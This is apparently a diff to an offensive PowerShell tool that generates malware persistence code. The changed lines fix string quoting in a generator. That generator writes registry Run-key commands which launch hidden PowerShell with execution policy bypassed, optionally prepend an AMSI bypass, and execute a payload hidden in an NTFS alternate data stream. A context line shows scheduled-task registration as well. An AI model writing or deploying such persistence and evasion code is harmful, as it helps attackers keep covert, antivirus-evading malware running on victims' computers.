@@ -788,10 +788,18 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings
         $block += $regAmsiPrefix
 
         # Build and set the registry value command
+        # Fix: $regPayloadCmd contains single quotes that break single-quoted string templates.
+        # Use @'...'@ (single-quoted here-string) — zero interpolation, exact literal output.
+        # AMSI case: single-quote wraps $regByp (opaque code), double-quote interpolates $hp/$sn at runtime.
+        # No-AMSI case: parenthesized double-quoted expression builds the ADS path cleanly.
         if (-not $NoAmsi) {
-            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C `"'+`$_regByp+'$regPayloadCmd`"'`n"
+            $block += @'
+$_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C "'+$_regByp+"IEX(gc '"+$hp+':'+$sn+"' -Raw)`""
+'@
         } else {
-            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C `"$regPayloadCmd`"'`n"
+            $block += @'
+$_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C "'+("IEX(gc '"+$hp+':'+$sn+"' -Raw)")+'"'
+'@
         }
 
         # Write registry Run keys based on triggers
